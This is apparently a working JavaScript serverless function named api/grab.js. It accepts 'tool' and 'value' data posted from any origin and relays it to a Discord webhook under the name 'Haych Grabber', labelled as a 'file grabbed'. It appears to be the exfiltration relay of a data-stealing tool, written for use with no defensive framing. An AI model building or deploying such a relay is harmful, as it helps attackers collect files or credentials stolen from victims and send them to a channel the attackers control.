// api/grab.js - Vercel Serverless Function (proxy for Discord webhook)

export default async function handler(req, res) {
  // Add CORS headers - this fixes Safari/iOS blocks
  res.setHeader('Access-Control-Allow-Origin', '*');           // Allow all (safe for this use)
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight OPTIONS request (Safari sends this first)
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Only allow POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed. Use POST.' });
  }

  // Get data from frontend
  const { tool, value } = req.body;

  if (!tool || !value) {
    return res.status(400).json({ error: 'Missing tool or value in request body' });
  }

  // Pull webhook from env var (set in Vercel dashboard)
  const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

  if (!WEBHOOK_URL) {
    console.error('DISCORD_WEBHOOK_URL is not set in environment variables');
    return res.status(500).json({ error: 'Server misconfigured - missing webhook URL' });
  }

  try {
    // Build Discord message
    const payload = {
      content: `**${tool.charAt(0).toUpperCase() + tool.slice(1)} file grabbed**\nValue:\n\`\`\`${value}\`\`\``,
      username: "Haych Grabber",
      // avatar_url: "https://i.imgur.com/youricon.png" // optional
    };

    // Send to Discord
    const discordRes = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (discordRes.ok) {
      return res.status(200).json({ success: true });
    } else {
      const errorText = await discordRes.text();
      console.error('Discord webhook failed:', discordRes.status, errorText);
      return res.status(discordRes.status).json({ error: 'Discord rejected the message' });
    }
  } catch (err) {
    console.error('Proxy crashed:', err.message);
    return res.status(500).json({ error: 'Internal server error' });
  }
}
